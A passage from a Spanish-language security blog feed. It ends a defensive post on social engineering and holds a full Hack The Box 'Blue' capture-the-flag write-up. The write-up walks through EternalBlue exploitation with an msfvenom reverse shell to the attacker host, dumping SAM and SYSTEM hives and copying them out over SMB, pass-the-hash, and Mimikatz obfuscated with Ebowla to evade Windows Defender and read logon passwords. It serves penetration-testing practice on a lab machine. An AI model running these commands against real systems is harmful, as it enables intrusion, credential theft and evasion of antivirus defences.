<p>En este otro ejemplo, miramos que el punto de entrada fue un <code class="language-plaintext highlighter-rouge">vishing</code>, así lograron persuadir y obtener el número de seguro social de los empleados y luego esta información la utilizaron en proveedores que los empleados tenían para obtener el acceso a sus cuentas. En este caso no fue tan crítico porque no comprometieron ningún sistema pero se dio lo que se conoce como data leak ya que se filtró información sobre la nueva Xbox que iba a salir en ese entonces, dando a conocer así las características que iba a poseer dicha consola.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/microsoft.png" />
</p>

<p>Ahora hablaremos de que técnicas emplean los ciberdelincuentes a la hora de elegir una empresa como objetivo, usan un ataque de ingeniería social dirigido y siguen una metodología para que el ataque sea más efectivo.</p>

<p>Antes de saber cuál es la metodología que emplean, hay que mencionar que existen dos tipos de ataques de ingeniería social:</p>

<ul>
  <li>Dirigidos</li>
  <li>No Dirigidos</li>
</ul>

<p>Dirigidos:
Son aquellos ataques en el que se tienes una empresa o una persona como objetivo, siguiendo una metodología para que el ataque logre ser más efectivo. Por ejemplo el ataque que hicieron a la empresa <code class="language-plaintext highlighter-rouge">Uber</code> el cual consistió en un <code class="language-plaintext highlighter-rouge">phishing</code>, y a partir de aquí los ciberdelincuentes lograron vulnerar sus sistemas.</p>

<p>No Dirigidos:
Por lo general este tipo de ataque se realiza de manera masiva enviando millones de <code class="language-plaintext highlighter-rouge">phishing</code> a usuarios al azar, con la finalidad de hacerse con la mayor cantidad de información posible y así obtener una recompensa mayor. Cabe mencionar que estos ataques son menos efectivos que los Dirigidos ya que no estudian a fondo su víctima.</p>

<p>La metodología que utilizan los ciberdelincuentes para un ataque dirigido seria la siguiente:</p>

<ul>
  <li>Investigación sobre la organización y empleados de la misma.</li>
  <li>Análisis y planificación de posibles vectores.</li>
  <li>Definición de empleados objetivo y análisis en profundidad.</li>
  <li>Desarrollo de pretextos y escenarios.</li>
  <li>Despliegue de la infraestructura necesaria.</li>
  <li>Ejecución de pruebas.</li>
  <li>Intrusión en la red interna.</li>
</ul>

<p>Como observamos siguen una metodología bien elaborada con la finalidad de que el ataque resulte ser muy efectivo para que logren caer los empleados de las empresas y así hacerse con sus datos para luego comprometer toda la empresa. Esto nos lleva a que los empleados de una empresa y nosotros como usuarios de cualquier tecnología debemos estar capacitados en temas de ciberseguridad para así lograr mitigar estos ataques ya que no hay otra manera de evitarlos, la única forma es estar debidamente informados.
Esta metodología también la utilizan los pentester en ejercicios de red team para simular completamente un ataque de ingeniería social usando las mismas técnicas que un ciberdelincuente, de esta manera estarían preparando al personal de una empresa para cualquier tipo de ataque de este tipo y haciendo más segura la empresa.</p>

<p>En el primer punto usan técnicas <code class="language-plaintext highlighter-rouge">OSINT</code> para recolectar la mayor cantidad de información posible sobre el objetivo.</p>

<p>En el segundo ya una vez reunida esa información la analizan y miran cual podría ser el mejor vector de ataque si un <code class="language-plaintext highlighter-rouge">phishing</code>, <code class="language-plaintext highlighter-rouge">vishing</code>, <code class="language-plaintext highlighter-rouge">baiting</code>, etc. o también puede usar todas las que ellos crean convenientes.</p>

<p>Después lo que hacen es analizar cuál podría ser el empleado o los empleados elegidos para atacar, ya que por ejemplo sería más efectivo si utilizan a alguien de <code class="language-plaintext highlighter-rouge">recursos humanos</code> que si eligen a alguien de <code class="language-plaintext highlighter-rouge">IT</code>, ya que al ser del departamento <code class="language-plaintext highlighter-rouge">IT</code> podría darse cuenta más rápido y evitar que logren comprometer la empresa.</p>

<p>Aquí en este punto van a ver cómo hacer caer a los empleados, haciéndoles creer que son parte del <code class="language-plaintext highlighter-rouge">equipo de soporte</code> o que son algún <code class="language-plaintext highlighter-rouge">proveedor</code> con la finalidad de que los empleados les den acceso o sus datos para colarse dentro de la empresa.</p>

<p>Ya en este punto crean todo lo que van a utilizar como por ejemplo en que área dejaran las <code class="language-plaintext highlighter-rouge">USB</code> tiradas en caso de ser un <code class="language-plaintext highlighter-rouge">baiting</code>, si es un <code class="language-plaintext highlighter-rouge">phishing</code> pues elaborar cuidadosamente y lo más parecido posible la plantilla de correo y al sitio donde serán redirigidos los empleados o el documento que van a adjuntar para lograr tener la mayor efectividad.</p>

<p>Ya aquí ejecutan las <code class="language-plaintext highlighter-rouge">pruebas</code> para ver si serán efectivas y en caso de serla estaríamos llegando al último punto que sería la <code class="language-plaintext highlighter-rouge">intrusión</code> en la red interna de la empresa y ya con esto estarían logrando su objetivo.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/ataquessocial2.jpg" />
</p>

<p>Ahora que ya vimos que es y cómo funciona la ingeniería social, es hora de aprender cómo evitar este tipo de ataques, para ello vamos a tener en cuenta un par de consejos:</p>
<ul>
  <li>
    <p>Cambie la configuración de spam en el correo electrónico:
No todos los proveedores de correos vienen debidamente configurados así que es nuestra responsabilidad configurarlos correctamente para así poder filtrar la mayor parte de correos y tener un poco más segura nuestra bandeja de entrada.</p>
  </li>
  <li>
    <p>Investigue la <code class="language-plaintext highlighter-rouge">fuente</code>:
Siempre que se reciba un enlace, un mensaje, un correo, etc. Es muy importante verificar de donde proviene y no importa si es por parte de un amigo hay que estar seguro que en realidad es el quien n os envía y no un ciberdelincuente que pudo haber quitado el acceso a la cuenta de nuestro amigo.</p>
  </li>
  <li>
    <p>Si algo parece demasiado bueno para ser cierto, seguramente sea <code class="language-plaintext highlighter-rouge">falso</code>:
Esto es algo muy común en estos tipos de ataques ya que por lo general te dirán que te ganaste algo sin siquiera estar participando, a partir de este momento deberíamos de alertarnos ya que seguramente se trate de un ataque de ingeniería social, es muy común también que las personas caigan más debido a estas técnicas ya que depende de nuestro nivel de economía en que nos encontremos seremos tentados a caer en este tipo de engaños pero recuerda como dicen por ahí <code class="language-plaintext highlighter-rouge">nada es gratis</code> y si lo es tiene un precio tu <code class="language-plaintext highlighter-rouge">información</code>.</p>
  </li>
  <li>
    <p>Utilice software de <code class="language-plaintext highlighter-rouge">seguridad</code> y confianza:
Nunca este de mas tener de la mano un buen software antivirus y anti malware, para así tener una mayor protección ante este tipo de ataques, aunque sin duda alguna la mejor defensa siempre será estar concientizado ante este tipo de ataques y sobre ciberseguridad, recuerda la ciberseguridad no es un gasto es una inversión como el seguro de un auto, no adquieres el seguro porque vas a chocar el auto si no que en caso de que suceda estas preparado para lo que pueda pasarle a este, es lo mismo a la hora de invertir en ciberseguridad para tu empresa, no quiere decir que pasaras bajo constate ataque, pero en caso de recibir uno tu personal estará debidamente capacitado y podrán evitar que comprometan la empresa.</p>
  </li>
  <li>
    <p>Utilice el sentido <code class="language-plaintext highlighter-rouge">común</code>:
Es algo muy curioso y parece sencillo de usar, pero a veces digo que el sentido común no parece tan común ya que algunos simplemente no lo usan. Siempre hay que estar <code class="language-plaintext highlighter-rouge">alerta</code> ante cualquier <code class="language-plaintext highlighter-rouge">msj</code> sospechoso que recibamos y más si es mediante una <code class="language-plaintext highlighter-rouge">red social</code>, nunca abrir <code class="language-plaintext highlighter-rouge">links</code> que te envíen por ahí a menos que sepas su procedencia, así que ya sabes si recibes algo y no estás seguro es mejor que no hagas clic ya que podrían robar tu información personal o tus cuentas.</p>
  </li>
  <li>
    <p>Sobre todo y no menos importante informarse y concientizarse sobre <code class="language-plaintext highlighter-rouge">ciberseguridad</code>:
Creo que este es uno de los puntos más importantes, ya que al menos para mí hoy en día es imprescindible que <code class="language-plaintext highlighter-rouge">todos</code> y si me refiero a todos aquellos que utilicemos un dispositivo para navegar por internet y que poseamos redes sociales, etc. En fin usar cualquier dispositivo tecnológico debemos aprender sobre ciberseguridad ya que la tecnología cada día crece a pasos agigantados y así como salen dispositivos nuevos, redes sociales nuevas y así con cada cosa, también salen nuevos ataques, nuevas técnicas que utilizan los ciberdelincuentes para hacerse con nuestros datos. Por eso es importante que aprendamos ya que al hacerlo sabremos lo peligros a los cuales nos enfrentamos e igual conoceremos multitud de ataques que existen y seremos más cuidadosos a la hora de navegar por internet.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/images/ingeniería-social/consejos.jpg" />
</p>

<p>Ahora conociendo todo esto nos haremos la siguiente interrogante ¿Por qué es tan peligrosa la ingeniería social?</p>

<p>La ingeniería social puede ocurrirle a cualquiera, ya sea en persona, por teléfono o en línea, y también es un método bastante fácil cuando se realizan estafas, fraudes u otros delitos. Los <code class="language-plaintext highlighter-rouge">ciberdelincuentes</code> no necesitan tener grandes conocimientos técnicos; solo tienen que ser capaces de engañarle para que les entregues datos sensibles. El hecho de que todos estemos en riesgo hace que sea una estafa potencialmente <code class="language-plaintext highlighter-rouge">devastadora</code>.</p>

<p>Las redes sociales han ayudado a los ciberdelincuentes a ser más habilidosos, creando perfiles falsos que parecen ser reales, o incluso suplantando a personas reales. Es importante estar alerta ante perfiles extraños o desconocidos en redes sociales.</p>

<p>Por estos motivos es uno de los ataques más peligrosos ya que es directamente con el usuario que se trata y no con el software.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/peligro.jpg" />
</p>

<p>Ya para ir concluyendo con el post, te dejare un par de herramientas que seguramente te ayudaran a la hora de identificar este tipo de ataques.</p>

<ul>
  <li><a href="https:https://www.virustotal.com/gui/home/upload">Virus Total</a>:</li>
</ul>

<p>Es una herramienta muy conocida, y lo que nos permite hacer es identificar archivos maliciosos, enlaces, ip, dominios, etc. Es una herramienta que sin duda alguna debemos tener a la mano para poder identificar de una mejor manera todo aquello de lo que nosotros tengamos duda o sospecha.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/virustotal.png" />
</p>

<ul>
  <li><a href="https://phishtank.org/">Phishtank</a>:</li>
</ul>

<p>Es una web que como su nombre lo indica es un tanque de sitios desde donde se realiza phishing, lo que nos permite hacer es que si tenemos duda de una web y ya fue reportada en el sitio web nos dira si es un phishing o no, en el caso de que no nos arroje información tampoco quiere decir que es seguro, simplmente no este reportada. También nos permite poder reportar una pagina que nosotros estemos seguros que sirve para hacer phishing, aportando nuestro granito de arena a la comunidad.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/phishtank.png" />
</p>

<ul>
  <li><a href="https://expandurl.net/">Expandurl</a>:</li>
</ul>

<p>Es una web sencilla pero muy útil ya que nos permite ver la url final de un enlace acortado, permitiéndonos ver hacia donde nos redirigirá esa url sin necesidad de visitarla.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/expandurl.png" />
</p>

<ul>
  <li><a href="https://phishingquiz.withgoogle.com/?hl=es-419">phishingquiz</a>:</li>
</ul>

<p>Una web creada por google para entrenarnos a la hora de identificar ataques de phishing, en el cual se nos presentara una serie de correos y nosotros deberemos ir tomando decisiones y decidir si se trata de un correo legítimo o phishing. Sin duda alguna una excelente herramienta para ayudarnos a detectar de una mejor manera este tipo de ataques y nos entrenara para fijarnos en aquellos detalles que antes no les prestábamos atención.</p>

<p align="center">
<img src="/assets/images/ingeniería-social/googlephish.jpg" />
</p>

<p><strong>Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.</strong></p>]]></content><author><name>ewor01</name></author><category term="phishing" /><category term="smishing" /><category term="baiting" /><category term="Ingeniería Social" /><summary type="html"><![CDATA[¿Te gustaría aprender un poco sobre Ingeniería social?, pues toma un refresco y palomitas.]]></summary></entry><entry><title type="html">Blue - Hack The Box</title><link href="http://localhost:4000/blue-hackthebox/" rel="alternate" type="text/html" title="Blue - Hack The Box" /><published>2023-01-15T00:00:00-06:00</published><updated>2023-01-15T00:00:00-06:00</updated><id>http://localhost:4000/blue-hackthebox</id><content type="html" xml:base="http://localhost:4000/blue-hackthebox/"><![CDATA[<p><img src="/assets/images/htb-writeup-blue/Blue_htb.png" alt="Blue_htb.png" /></p>

<p>Certificaciones a aplicar: OSCP</p>

<p>Dificultad: Fácil</p>

<p>Habilidades:</p>

<ul>
  <li>SMB Enumeration</li>
  <li>Eternalblue Exploitation (MS17-010) [d4t4s3c Exploit]</li>
  <li>Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)</li>
  <li>Enabling RDP from CrackMapExec (EXTRA)</li>
  <li>Windows Persistence techniques (EXTRA)</li>
  <li>Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)</li>
</ul>

<h1 id="ip-de-la-maquina">IP de la Maquina</h1>

<p>10.10.10.40</p>

<h1 id="reconocimiento">Reconocimiento</h1>

<p>Identificando el sistema operativo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.10.40
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/sistema_operativo.png" alt="sistema operativo.png" /></p>

<p>Escaneo de los puertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.40 <span class="nt">-oG</span> allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/escaneo.png" alt="escaneo.png" /></p>

<p>Función extractPorts</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/puertos.png" alt="puertos.png" /></p>

<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>

<p>Buscando versiones y servicios que corren para esos puertos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p135</span>,139,445,49152 10.10.10.40 <span class="nt">-oN</span> targeted
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/script_nmap.png" alt="script nmap.png" /></p>

<p>Vemos que el puerto 445 esta abierto en el cual corre el servicio SMB y lo analizamos con crackmapexec</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.40 
</code></pre></div></div>

<p>Como vemos que es un widows 7 profesional y si el smb esta expuesto puede que sea vulnerable al eternal blue así que vamos a analizar ese puerto primero</p>

<p>Ejecutamos un script de nmap para verificar si es vulnerable al eternal blue</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> <span class="s2">"vuln and safe"</span> <span class="nt">-p445</span> 10.10.10.40 oN smbVulnscan
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/script_vulnerabilidades.png" alt="script vulnerabilidades.png" /></p>

<p>En efecto vemos que es vulnerable y nos pone Remote code execution</p>

<h1 id="explotación">Explotación</h1>

<p>Buscamos un repositorio en github donde se encuentran unos scripts para explotar la vulnerabilidad manualmente, nos dirigimos a la carpeta exploits y nos clonamos el repositorio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/d4t4s3c/Win7Blue.git

</code></pre></div></div>

<p>Nos dirigimos a la carpeta que acabamos de clonar y buscamos eternal blue scanner y lo ejecutamos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 eternalblue_scanner.py 10.10.10.40
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/Vulnerable.png" alt="Vulnerable.png" /></p>

<p>Luego de verificar que es Vulnerable creamos un payload con msf venom</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> raw <span class="nt">-o</span> payload.bin <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nv">LHOST</span><span class="o">=</span>10.10.14.9 <span class="nv">LPORT</span><span class="o">=</span>443
</code></pre></div></div>

<p>Colocamos nuestra ip en LHOST y el puerto que queramos para la reverse shell, -o el nombre que queramos asignarle al payload</p>

<p><img src="/assets/images/htb-writeup-blue/payload.png" alt="payload.png" /></p>

<p>Luego de crear el payload hacemos un merge con cat de el archivo  sc_x64_kernel.bin y payload.bin generado anteriormente</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>sc_x64_kernel.bin payload.bin <span class="o">&gt;</span> exploit.bin
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/merge.png" alt="merge.png" /></p>

<p>Ahora procedemos a lanzar el scrript ms17_010_eternalblue.py, pero antes de lanzarlo nos ponemos en escucha con netcat</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-nlvp</span> 443
</code></pre></div></div>

<p>Ahora lanzamos el script para explotar la vulnerabilidad eternal blue</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ms17_010_eternalblue.py 10.10.10.40 exploit.bin
</code></pre></div></div>

<p>Si no funciona a la primera volver a intentar hasta que nos entable la conexión, y listo ya tendríamos acceso a la maquina victima.</p>

<p><img src="/assets/images/htb-writeup-blue/acceso_a_la_maquina.png" alt="acceso a la maquina.png" /></p>

<p>Una vez con acceso a la maquina verificamos que tipo de usuario somos</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/whoami.png" alt="whoami.png" /></p>

<p>Vemos que somos nt authority\system, procedemos a buscar las flags, ya que en este caso somos un usuario con máximos privilegios y este tipo de vulnerabilidad ya nos otorga dichos privilegios, en otros casos tendremos que elevar privilegios.</p>

<p>Procedemos a buscar las flags, primero la de el user</p>

<p><img src="/assets/images/htb-writeup-blue/user.png" alt="user.png" /></p>

<p>Luego la de root</p>

<p><img src="/assets/images/htb-writeup-blue/root.png" alt="root.png" /></p>

<p>Listo con esto estaría completada la maquina, no obstante se harán un par de cosas extras como ejemplo que puedan servir para practicar y para otras maquinas.</p>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>

<p>Como ya lo mencionamos la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa.</p>

<h1 id="extra">Extra</h1>

<p>Como extra nos dirigiremos al directorio Temp</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">Windows\Temp</span><span class="w">
</span></code></pre></div></div>

<p>Nos crearemos un directorio llamado PostExploitation</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mkdir</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
</span></code></pre></div></div>

<p>luego entramos en ese directorio</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
</span></code></pre></div></div>

<p>El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\system</span><span class="w"> </span><span class="nx">system.backup</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\sam</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/sam_y_system.png" alt="sam y system.png" /></p>

<p>Ahora los vamos a trasladar a nuestro sistema para analizarlos, los copiamos en la carpeta content, los vamos a copiar utilizando impacket</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
</code></pre></div></div>

<p>iniciamos el recurso compartido en la carpeta content donde los copiaremos</p>

<p>Para pasar los archivos utilizamos el siguiente comando en la maquina victima</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">copy</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\sam</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">system.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\system</span><span class="w">
</span></code></pre></div></div>

<p>En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.</p>

<p><img src="/assets/images/htb-writeup-blue/sam_y_system_copy.png" alt="sam y system copy.png" /></p>

<p>Ahora cerramos el impacket y ahi tendremos los archivos</p>

<p><img src="/assets/images/htb-writeup-blue/files.png" alt="files.png" /></p>

<p>Vamos a utilizar impacket-secretsdump de la siguiente manera, recordemos que no necesitamos colocar una ip porque ya los tenemos en local</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-sam</span> sam <span class="nt">-system</span> system LOCAL
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/dump.png" alt="dump.png" /></p>

<p>Aquí tendríamos lo que nos interesa, que son los hashes de los usuarios</p>

<p>Con esto verificamos si el hash es correcto</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec cmb 10.10.10.40 <span class="nt">-u</span> <span class="s1">'Administrator. -H '</span>cdf51b162460b7d5bc898f493751a0cc<span class="s1">'
</span></code></pre></div></div>

<p>y nos pondrá Pwn3d! y con esto ya tendríamos como una persistencia y hacer cosas.</p>

<p>Por ejemplo dumpear lsa a ver si logramos ver algo en texto claro</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec cmb 10.10.10.40 <span class="nt">-u</span> <span class="s1">'Administrator. -H '</span>cdf51b162460b7d5bc898f493751a0cc<span class="s1">' --lsa
</span></code></pre></div></div>

<p>No logramos ver nada interesante en texto claro entonces lo descartamos</p>

<p>Podemos operar para conectarnos a la maquina por ejemplo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec WORKGROUP/Adminnistrator@10.10.10.40 <span class="nt">-hashes</span> :cdf51b162460b7d5bc898f493751a0cc
</code></pre></div></div>

<p>Con esto lograríamos hacer pass the hash  y tener una pequeña persistencia porque ya tenemos el hash</p>

<p><img src="/assets/images/htb-writeup-blue/pass_the_hash.png" alt="pass the hash.png" /></p>

<p>Ahora vamos a ver de que forma podemos obtener la contraseña, para ello vamos a utilizar mimikatz, primero lo localizamos en nuestro equipo y lo copiamos a la carpeta content</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate mimikatz.exe
<span class="nb">cp</span> /usr/share/mimikatz/x64/mimikatz.exe <span class="nb">.</span>
</code></pre></div></div>

<p>Luego utilizaremos una herramienta para burlar el defender y posibles detecciones en base a lo que nosotros subamos a la maquina victima.</p>

<p>Nos clonamos el siguiente repositorio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Genetic-Malware/Ebowla
</code></pre></div></div>

<p>Esta herramienta sirve para tratar de eludir posibles detecciones ya que juega con las propias variables de entorno de la maquina, para crear una muestra cifrada por decirlo o ofuscada, donde se emplea las propias variables de entorno del sistema donde una vez se ejecute descifrar la muestra y llegara a poder ejecutarlo.</p>

<p>Nos dirigimos a la carpeta Ebowla y modificaremos un par de cosas de el archivo genetic.config</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>output_type <span class="o">=</span> GO
payload_type <span class="o">=</span> EXE
</code></pre></div></div>

<p>la parte que mas retocamos es la de variables de entorno [[ENV_VAR]] hay que tener cuidado porque si nos equivocamos con alguna de las variables de entorno existentes la muestra no la va a lograr interpretar porque recordemos que toma las variables de entorno de la propia maquina para que cuando subamos la muestra que esta cifrada a la hora de tratar de descifrar esa muestra para interpretarla como nos equivoquemos no va a interpretar nada.</p>

<p>Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">username</span><span class="o">%</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">computername</span><span class="o">%</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">homepath</span><span class="o">%</span><span class="w">
</span></code></pre></div></div>

<p>Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.</p>

<p>Nos debería quedar algo así</p>

<p><img src="/assets/images/htb-writeup-blue/variables_de_entorno.png" alt="variables de entorno.png" /></p>

<p>Para compilar como python2 ya no tiene soporte tendríamos que instalarlo e instalar las de dependencias que nos den error hasta que ya podamos ejecutar el script</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 ebowla.py mimikatz.exe genetic.config
</code></pre></div></div>

<p>Aquí le pasamos el archivo a cifrar y el archivito genetic.conf previamente configurado con las variables de entorno.</p>

<p><img src="/assets/images/htb-writeup-blue/ebowla.png" alt="ebowla.png" /></p>

<p>Listo ya tendríamos el archivo en la carpeta output</p>

<p>Ahora vamos a compilar el archivo que nos genero en output</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimi.exe
</code></pre></div></div>

<p>le asignamos el nombre que queramos, en este caso lo llame mimi.exe, si todo sale bien nos pondrá esto, si nos da algún error solo instalar los paquetes necesarios.</p>

<p><img src="/assets/images/htb-writeup-blue/mimi_encode.png" alt="mimi encode.png" /></p>

<p>Ahora nos vamos a transferir el archivo con python3 por el puerto 80 a la maquina victima</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nx">http://10.10.14.9/mimi.exe</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/download_file.png" alt="download file.png" /></p>

<p>Listo ya tendríamos el archivo en la maquina victima</p>

<p>Ahora a ejecutar nuestro archivo</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimi.exe</span><span class="w">
</span></code></pre></div></div>

<p><img src="/assets/images/htb-writeup-blue/mimikatz.png" alt="mimikatz.png" /></p>

<p>Listo nos funciono ahora vamos por  las credenciales</p>

<p>Lo hacemos de la siguiente manera</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">privilege::debug</span><span class="w">
</span><span class="nx">sekurlsa::logonPasswords</span><span class="w">
</span></code></pre></div></div>

<p>Si todo sale bien nos mostrara la credencial</p>

<p><img src="/assets/images/htb-writeup-blue/credentials.png" alt="credentials.png" /></p>

<p>Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.</p>

<p>Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.</p>

<p>Les dejo la resolución de la misma por s4vitar <a href="https://www.youtube.com/watch?v=92XycxcAXkI">Ver video</a></p>]]></content><author><name>ewor01</name></author><category term="hackthebox" /><category term="OSCP" /><category term="Fácil" /><category term="Windows" /><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html"><![CDATA[Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más.]]></summary></entry></feed>